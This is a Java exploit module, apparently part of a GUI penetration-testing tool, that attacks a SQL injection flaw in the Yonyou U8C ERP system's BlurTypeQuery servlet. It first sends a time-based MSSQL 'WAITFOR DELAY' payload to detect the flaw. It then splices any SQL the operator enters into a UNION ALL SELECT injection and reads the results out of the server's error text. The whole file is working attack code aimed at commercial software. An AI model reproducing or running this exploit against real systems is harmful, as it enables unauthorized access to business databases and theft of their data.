package exp.oa.yongyou.u8c;

import com.alibaba.fastjson.JSON;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class yongyou_U8C_TaskTreeQuery_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url,cmd, textArea, textArea_cmd);
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            long var = HttpTools_getTime.get(url + "/servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1')%20WAITFOR%20DELAY%20'0%3A0%3A3'--%20SqzK" , head, "utf-8");
            if (var>3000) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_U8C_TaskTreeQuery_sqli ]");
                    textArea.appendText("\n (1) 延时注入");
                    textArea.appendText("\n (2) 联合注入,CMD处输入Mssql语句执行");
                    textArea.appendText("\n");
                });

                String target_req = url+"/servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1')%20WAITFOR%20DELAY%20'0%3A0%3A3'--%20SqzK";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n"
                    );
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url,String sql, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response get_res = HttpTools.get(url + "/servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1')%20UNION%20ALL%20SELECT%20NULL%2CNULL%2C"+sql+"%2CNULL%2CNULL%2CNULL--%20HoaZ" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("success")) {
                String var = get_res.getText();
                String var1 = var.substring(var.indexOf("值")+2,var.indexOf("转换")).replace("\\u0027","");
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql);
                    textArea_cmd.appendText(var1 +"\n");
                    textArea.appendText("\n");
                });

                return true;
            }else {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行失败");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
